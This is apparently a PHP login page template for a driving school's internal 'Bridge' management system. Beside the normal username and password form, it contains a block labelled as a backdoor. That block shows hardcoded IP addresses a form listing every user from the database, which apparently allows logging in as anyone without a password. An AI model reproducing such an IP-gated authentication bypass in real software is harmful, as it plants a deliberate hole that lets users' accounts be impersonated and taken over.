<div class="container container-login"> 
    <div class="login-pic col-md-12">
        <img src="images/bridge.jpg">
    </div>
    <div class="header-box">
        <h1><small>autoškolaeasy.cz</small><br>Bridge</h1>
    </div>
    
    <div class="login-box">
    	<form id="frontdoor_form" action="login_process.php" method="POST">
	        <label>Login</label>&nbsp;<input name="login" type="text" class="form-control" />
	        <label>Heslo</label>&nbsp;<input name="passw" type="password" class="form-control"/>
	        <br />
	        <button type="submit" class="btn btn-primary btn-lg"><span class="glyphicon glyphicon-log-in"></span>&nbsp;Přihlásit</button>
		</form>



        <?  if ( /************************BACKDOOR NA IP***************************/
				($_SERVER['REMOTE_ADDR']=='85.71.8.143') /*Rynoltice*/
				OR ($_SERVER['REMOTE_ADDR']=='90.182.56.243') /*Holeho*/

			):?>
            <br /><br />
            <h5>Backdoor</h5>
            <form id="backdoor_form" action="login_process.php" method="POST" class="form-inline">
                <table>
                    <tr>
                        <td>
                            <select name="backdoor" class="form-control">
                                <optgroup label="aktivní uživatelé">
                                    <?
                                        $sql='	SELECT UZid, jmeno
                                                FROM uzivatel
                                                WHERE aktivni=1';
                                        $result=mysqli_query($db_connect, $sql);
                                        while ($radek=mysqli_fetch_array($result)):?>
                                            <option value="<? echo $radek['UZid']?>"><? echo $radek['jmeno']?></option>
                                        <? endwhile?>
                                  </optgroup>
                                  <optgroup label="neaktivní uživatelé">
                                    <?       
                                      $sql='	SELECT UZid, jmeno
                                                FROM uzivatel
                                                WHERE aktivni=0';
                                       $result=mysqli_query($db_connect, $sql);
                                      while ($radek=mysqli_fetch_array($result)):?>
                                          <option value="<? echo $radek['UZid']?>"><? echo $radek['jmeno']?></option>
                                      <? endwhile?>
                                </optgroup>
                            </select>
                        </td>
                        <td>&nbsp;<button id="button_backdoor" type="button" class="btn btn-primary"><span class="glyphicon glyphicon-log-in"></span></button></td>
                    <tr>
                </table>
            </form>
        <? endif?>
        
        
    </div>
</div>
<br clear=all/>
<div class="container-fluid copyright">
    <p>Bridge Management System - bootstrap framework - design & code &copy; <a href="mailto:lukas.kobera@autoskolaeasy.cz">Lukáš Kobera</a></p>
</div>